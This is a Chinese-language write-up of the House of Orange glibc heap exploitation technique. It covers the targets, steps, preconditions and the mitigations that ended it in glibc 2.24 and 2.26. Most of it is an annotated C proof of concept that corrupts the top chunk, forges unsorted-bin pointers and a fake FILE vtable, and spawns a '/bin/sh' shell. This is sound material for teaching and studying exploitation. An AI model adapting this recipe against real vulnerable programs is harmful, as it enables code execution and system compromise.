# 漏洞利用文档：House of Orange

## 攻击对象
- **Top Chunk**: 地址如`0x602400`，通过堆溢出修改其size字段（如修改为`0xc01`），触发sysmalloc。
- **Unsorted Bin**: 释放的旧top chunk（如`0x602400`）进入unsorted bin，伪造其fd和bk指针。
- **_IO_list_all**全局变量: 地址如`0x7ffff7dd2520`，通过伪造unsorted bin chunk的bk指针修改它，指向伪造的FILE结构。
- **FILE结构**: 在堆上（如`0x602400`）伪造FILE结构，控制`_IO_OVERFLOW`指向`winner`函数。

## 利用过程
1. **初始分配**: 分配堆块p1（大小`0x400-16`），获取top chunk指针。
2. **堆溢出**: 通过溢出修改top chunk的size为`0xc01`（含PREV_INUSE位），强制触发sysmalloc。
3. **堆扩展**: 分配更大块p2（大小`0x1000`），导致堆扩展，旧top chunk被释放到unsorted bin。
4. **地址计算**: 利用unsorted bin的fd指针泄露main_arena地址，计算`_IO_list_all`地址。
5. **指针伪造**: 伪造unsorted bin chunk的bk指针为`_IO_list_all - 0x10`，为unlink操作做准备。
6. **大小修改**: 修改chunk大小为`0x61`，使其在分配时被放入smallbin[4]。
7. **FILE伪造**: 在chunk起始处写入`/bin/sh`，并设置FILE结构的`_mode=0`、`_IO_write_base=2`、`_IO_write_ptr=3`，伪造vtable指向跳转表，跳转表中`_IO_OVERFLOW`指向`winner`函数。
8. **触发攻击**: 调用`malloc(10)`，触发unlink修改`_IO_list_all`，安全检查失败调用abort，abort调用`_IO_flush_all_lockp`遍历链表，执行伪造的`_IO_OVERFLOW`即`system("/bin/sh")`。

## 利用条件
- **堆溢出**: 能够覆盖top chunk的size字段（如通过缓冲区溢出）。
- **地址泄露**: 需要知道heap和libc的地址（通过unsorted bin的fd指针泄露main_arena）。
- **glibc版本**: 适用于glibc 2.23及之前版本（2.24引入FILE vtable白名单检查，2.26后malloc_printerr不再调用`_IO_flush_all_lockp`）。

## 利用效果
- **控制流劫持**: 通过abort机制执行任意代码（如`system("/bin/sh")`），获得shell。
- **任意地址写**: 通过unlink操作修改`_IO_list_all`全局变量。

## 涉及缓解机制
- **unlink检查**: glibc的unlink宏有双向链表完整性检查，但house_of_orange在特定条件下绕过（如伪造指针时unlink操作发生在检查之前）。
  - 相关glibc源码（malloc.c）:
    ```c
    #define unlink(AV, P, BK, FD) {
        FD = P->fd;
        BK = P->bk;
        if (__builtin_expect (FD->bk != P || BK->fd != P, 0))
            malloc_printerr (check_action, "corrupted double-linked list", P, AV);
        else {
            FD->bk = BK;
            BK->fd = FD;
            // ...
        }
    }
    ```
- **FILE vtable白名单**: glibc 2.24开始，`_IO_FILE`的vtable指针必须指向只读段的白名单地址，防止伪造。
- **malloc_printerr变化**: glibc 2.26后，`malloc_printerr`不再调用`_IO_flush_all_lockp`，使攻击失效。

## Proof of Concept
以下是house_of_orange漏洞利用原型的源码，添加了中文注释以解释关键步骤。

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

/*
  House of Orange 利用堆溢出破坏 _IO_list_all 指针
  需要泄露堆和libc地址
  参考: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
*/

/*
   此函数模拟已知system函数地址的场景
*/
int winner ( char *ptr);

int main()
{
    /*
      House of Orange 始于假设堆上存在缓冲区溢出，可以破坏Top chunk（也称为Wilderness chunk）。
      执行开始时，整个堆是Top chunk的一部分。
      初始分配通常从Top chunk分割出来服务请求。
      因此，每次分配后，Top chunk逐渐变小。
      当Top chunk的大小小于请求值时，有两种可能：
        1) 扩展Top chunk
        2) Mmap新页面
      如果请求大小小于0x21000，则采用前者。
    */

    char *p1, *p2;
    size_t io_list_all, *top;

    fprintf(stderr, "此技术的攻击向量在glibc 2.26后被移除，因为malloc_printerr不再调用_IO_flush_all_lockp，\n"
        "提交号: 91e7cf982d0104f0e71770f5ae8e3faf352dea9f\n");
    fprintf(stderr, "自glibc 2.24起，_IO_FILE vtable被检查白名单，破坏了此利用，\n"
        "提交号: db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");

    /*
      首先，在堆上分配一个chunk。
    */
    p1 = malloc(0x400-16);  // 分配初始堆块，大小0x3f0字节，地址如0x602010

    /*
      堆通常初始分配时Top chunk大小为0x21000。
      由于我们已经分配了0x400的chunk，剩余大小为0x20c00，设置PREV_INUSE位后为0x20c01。
      堆边界是页对齐的。Top chunk作为堆的最后chunk，其结束地址也必须页对齐。
      另外，如果相邻chunk被释放，它会与Top chunk合并，因此Top chunk的PREV_INUSE位总是设置。
      所以必须满足两个条件：
        1) Top chunk地址 + size 必须页对齐
        2) Top chunk的prev_inuse位必须设置。
      我们可以设置Top chunk大小为0xc00 | PREV_INUSE（即0xc01）来满足条件。
      剩余大小0x20c01被忽略。
    */

    top = (size_t *) ( (char *) p1 + 0x400 - 16);  // 获取top chunk指针，地址如0x602400
    top[1] = 0xc01;  // 修改top chunk的size为0xc01（含PREV_INUSE位），触发堆溢出利用

    /* 
      现在请求一个比Top chunk大小更大的chunk。
      malloc尝试通过扩展Top chunk来服务此请求，这会调用sysmalloc。
      通常，堆布局为：
        |------------|------------|------...----|
        |    chunk   |    chunk   | Top  ...    |
        |------------|------------|------...----|
      heap start                     heap end
      新分配的区域与旧堆结束地址连续，因此Top chunk的新大小是旧大小加上新分配大小。
      malloc使用fencepost chunk来跟踪大小变化，之后该chunk被释放。
      在我们的场景中，堆布局变为：
        |------------|------------|------..--|--...--|---------|
        |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
        |------------|------------|------..--|--...--|---------|
      heap start                     heap end
      新Top chunk从堆结束地址相邻处开始，旧Top chunk被释放。
      由于旧Top chunk大小大于fastbin大小，它被添加到unsorted bin。
    */

    p2 = malloc(0x1000);  // 分配更大块，大小0x1000，触发sysmalloc，释放旧top chunk到unsorted bin，地址如0x623010

    /*
      注意，上述chunk会被分配在mmap的新页面中，位于旧堆结束之后。
      现在旧Top chunk被释放并加入unsorted bin。
      攻击第二阶段开始：我们假设有溢出可以覆盖旧top chunk的size。
      我们再次利用溢出来覆盖unsorted bin中chunk的fd和bk指针。
      有两种常见利用方式：
        - 通过设置指针在任意位置分配内存（需要至少两次分配）
        - 利用chunk的unlink操作进行受控写，目标为libc的main_arena unsorted-bin-list（需要至少一次分配）
      我们采用后者，由Angelboy开发。
      攻击利用abort调用本身，当libc检测到堆状态错误时触发abort。
      abort会调用_IO_flush_all_lockp刷新所有文件指针，遍历_IO_list_all链表并调用_IO_OVERFLOW。
      目标是覆盖_IO_list_all指针为伪造的文件指针，其_IO_OVERFLOW指向system，前8字节为'/bin/sh'，
      这样调用_IO_OVERFLOW(fp, EOF)变为system('/bin/sh')。
      更多文件指针利用参考: https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/
      _IO_list_all地址可以从free chunk的fd和bk计算，因为它们指向libc的main_arena。
    */

    io_list_all = top[2] + 0x9a8;  // 计算_IO_list_all地址，top[2]是fd指针，指向main_arena+88

    /*
      我们计划覆盖旧top的fd和bk指针（现在在unsorted bin中）。
      当malloc尝试通过分割此free chunk满足请求时，chunk->bk->fd会被覆盖为libc main_arena中unsorted-bin-list的地址。
      注意此覆盖发生在安全检查之前，因此总会发生。
      这里，我们需要chunk->bk->fd为_IO_list_all的值。
      所以，设置chunk->bk为_IO_list_all - 16。
    */

    top[3] = io_list_all - 0x10;  // 设置bk指针为_IO_list_all - 0x10，以便unlink时修改_IO_list_all

    /*
      最后，system函数会被调用，参数为此文件指针。
      如果前8字节填充为/bin/sh，则等价于system(/bin/sh)。
    */

    memcpy( ( char *) top, "/bin/sh\x00", 8);  // 复制"/bin/sh"到chunk起始，作为system的参数

    /*
      _IO_flush_all_lockp函数遍历_IO_list_all链表中的文件指针。
      由于我们只能用main_arena的unsorted-bin-list覆盖此地址，目标是控制对应fd-ptr的内存。
      下一个文件指针的地址位于base_address+0x68，对应smallbin-4（包含大小90-98的smallbins）。
      因为我们溢出旧top chunk，我们也控制其size字段。
      设置size为0x61（97，含PREV_INUSE位），并触发一个不匹配的小分配，malloc会将旧chunk放入smallbin-4。
      由于该bin当前为空，旧top chunk成为新头，占据main_arena的smallbin[4]位置，最终代表伪造文件指针的fd-ptr。
      除了排序，malloc还会进行大小检查，在排序旧top chunk并跟随伪造fd指针到_IO_list_all后，
      它会检查对应size字段，发现大小小于MINSIZE（size <= 2 * SIZE_SZ），触发abort调用启动攻击链。
    */

    top[1] = 0x61;  // 修改chunk大小为0x61，使其在分配时被放入smallbin，并触发安全检查失败

    /*
      现在满足伪造文件指针的约束条件，以通过_IO_flush_all_lockp的检查。
      我们需要满足第一个条件：fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base。
    */

    FILE *fp = (FILE *) top;  // 将top指针视为FILE结构

    /*
      1. 设置mode为0: fp->_mode <= 0
    */
    fp->_mode = 0; // top+0xc0 设置_mode为0

    /*
      2. 设置write_base为2和write_ptr为3: fp->_IO_write_ptr > fp->_IO_write_base
    */
    fp->_IO_write_base = (char *) 2; // top+0x20 设置_IO_write_base为2
    fp->_IO_write_ptr = (char *) 3; // top+0x28 设置_IO_write_ptr为3

    /*
      4) 最后设置跳转表到可控内存并放置system在那里。
      跳表指针紧跟在FILE结构后：base_address+sizeof(FILE) = jump_table
        4-a) _IO_OVERFLOW 调用偏移3处的指针：jump_table+0x18 == winner
    */
    size_t *jump_table = &top[12]; // 跳转表地址，如0x602460
    jump_table[3] = (size_t) &winner;  // 设置_IO_OVERFLOW为winner函数
    *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // top+0xd8 设置vtable指针

    /* 最后，调用malloc触发整个攻击链 */
    malloc(10);  // 触发攻击链：unlink修改_IO_list_all，安全检查失败触发abort，abort调用_IO_flush_all_lockp，执行system("/bin/sh")

    /*
      libc的错误信息会打印到屏幕，但你会获得shell。
    */

    return 0;
}

int winner(char *ptr)
{ 
    system(ptr);  // 执行system("/bin/sh")
    syscall(SYS_exit, 0);
    return 0;
}
```